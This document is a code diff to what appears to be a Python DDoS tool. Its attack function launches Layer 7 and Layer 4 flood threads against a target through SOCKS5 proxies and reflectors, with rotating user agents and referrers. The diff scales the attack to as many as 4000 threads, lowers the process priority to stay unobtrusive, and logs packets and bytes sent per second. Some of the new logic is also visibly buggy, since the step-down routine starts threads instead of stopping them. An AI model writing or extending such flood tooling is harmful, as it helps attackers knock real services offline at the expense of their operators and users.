@@ -1,5 +1,6 @@
 import logging
 import os
+import sys
 from contextlib import suppress
 from json import load
 from logging import basicConfig, getLogger, shutdown
@@ -11,6 +12,7 @@ from threading import Event, Thread
 from time import sleep, time, perf_counter
 from typing import List, Union
 
+import psutil
 from PyRoxy import Tools as ProxyTools, ProxyType
 from icmplib import Host
 from requests import Response
@@ -52,10 +54,10 @@ def attack(
     attack_method: str,  # TODO: add option to use multiple attack methods
     target: Target,
     proxy_type: ProxyType = ProxyType.SOCKS5,
-    proxies_file_path: str = "proxies/socks5.txt",
-    user_agents_file_path: str = "user_agents.txt",
-    referrers_file_path: str = "referrers.txt",
-    reflectors_file_path: str = None
+    proxies_file_path: str | None = "proxies/socks5.txt",
+    user_agents_file_path: str | None = "user_agents.txt",
+    referrers_file_path: str | None = "referrers.txt",
+    reflectors_file_path: str | None = None
 ):
     # LOAD CONFIG FILES
     user_agents = read_configuration_file_lines(user_agents_file_path) if user_agents_file_path is not None else []
@@ -69,7 +71,7 @@ def attack(
         exit(f"Provided method ('{attack_method}') not found. Available methods: {', '.join(Methods.ALL_METHODS)}")
     # check target
     if not target.is_valid():
-        exit(f"Provided target ('{target}') has neither valid IPv4 nor URL. Please provide a valid target next time.")
+        exit(f"Provided target ('{target}') does not have a valid IPv4 (or it could not be resolved). Please provide a valid target next time.")
 
     # HANDLE BOMBARDIER
     if attack_method == "BOMB":
@@ -175,12 +177,15 @@ def attack(
     # TODO: launch a lot of threads according to the given methods
 
     # PREPARE FOR THREAD MANAGEMENT
+    INITIAL_THREADS_COUNT = 100
+    THREADS_MAX_LIMIT = 4000
+    THREADS_MIN_LIMIT = 1
+    THREADS_STEP = 100
     thread_stop_events: List[Event] = []
 
     def start_new_attack_thread():
         stop_event = Event()
         stop_event.clear()
-        thread_stop_events.append(stop_event)
 
         # TODO: select random attack method from the list (when there will be multiple)
         selected_attack_method = attack_method
@@ -188,10 +193,10 @@ def attack(
         if selected_attack_method in Methods.LAYER7_METHODS:
             Layer7(target.url, target.ip, selected_attack_method, UNLIMITED_RPC, stop_event, user_agents, referrers, proxies, BYTES_SENT, PACKETS_SENT).start()
         elif selected_attack_method in Methods.LAYER4_METHODS:
-            print("Start layer 4", flush=True)
             selected_proxies = proxies if selected_attack_method in Methods.WHICH_SUPPORT_PROXIES else None
             Layer4((target.ip, target.port), reflectors, selected_attack_method, stop_event, selected_proxies, BYTES_SENT, PACKETS_SENT).start()
 
+        thread_stop_events.append(stop_event)
         stop_event.set()
 
     def stop_attack_thread():
@@ -201,41 +206,71 @@ def attack(
         thread_to_stop_event = thread_stop_events.pop()
         thread_to_stop_event.clear()
 
-    INITIAL_THREADS_COUNT = 1
-    STEP = 100
+    def running_threads_count() -> int:
+        return len(thread_stop_events)
+
+    def step_up():
+        for _ in range(THREADS_STEP):
+            if running_threads_count() >= THREADS_MAX_LIMIT:
+                break
+            start_new_attack_thread()
+
+    def step_down():
+        for _ in range(THREADS_STEP):
+            if running_threads_count() <= THREADS_MIN_LIMIT:
+                break
+            start_new_attack_thread()
+
+    # LOWER PROCESS PRIORITY
+    process = psutil.Process(os.getpid())
+    if os.name == 'nt':
+        process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
+    else:
+        process.nice(19)
 
     # ATTACK
     logger.info(f"Starting attack at {target.ip}:{target.port} using {attack_method} attack method.")
     for _ in range(INITIAL_THREADS_COUNT):
         start_new_attack_thread()
 
+    global last_counters_update_time
+    last_counters_update_time = time()
+
     while True:
         # TODO:
         #       - check CPU utilization
         #       - decrease/increase threads
+        # step_up()
         #       - push attack status into the queue
 
         # update counters
         pps, tp, bps, tb = update_counters(PACKETS_SENT, TOTAL_PACKETS_SENT, BYTES_SENT, TOTAL_BYTES_SENT)
-        logger.info(f"Total bytes sent: {tb}, total requests: {tp}, BPS: {bps}, PPS: {pps}")
 
         sleep(1)
-        stop_attack_thread()
+        logger.info(f"Total bytes sent: {tb}, total requests: {tp}, BPS: {bps}/s, PPS: {pps} p/s, active threads: {len(thread_stop_events)}")
+        # stop_attack_thread()
+
+
+last_counters_update_time = 0
 
 
 def update_counters(rolling_packets_counter: Counter,
                     total_packets_counter: Counter,
                     rolling_bytes_counter: Counter,
                     total_bytes_counter: Counter) -> (str, str, str, str):
+    global last_counters_update_time
+    time_since_last_update = time() - last_counters_update_time
+
     # update total request counts
     total_packets_counter += int(rolling_packets_counter)
     rolling_packets_counter.set(0)
     total_bytes_counter += int(rolling_bytes_counter)
     rolling_bytes_counter.set(0)
+    last_counters_update_time = time()
 
     # return current stats
-    pps = Tools.humanformat(int(rolling_packets_counter))
-    bps = Tools.humanbytes(int(rolling_bytes_counter))
+    pps = Tools.humanformat(int(int(rolling_packets_counter) / time_since_last_update))
+    bps = Tools.humanbytes(int(int(rolling_bytes_counter) / time_since_last_update))
     tp = Tools.humanformat(int(total_packets_counter))
     tb = Tools.humanbytes(int(total_bytes_counter))
 
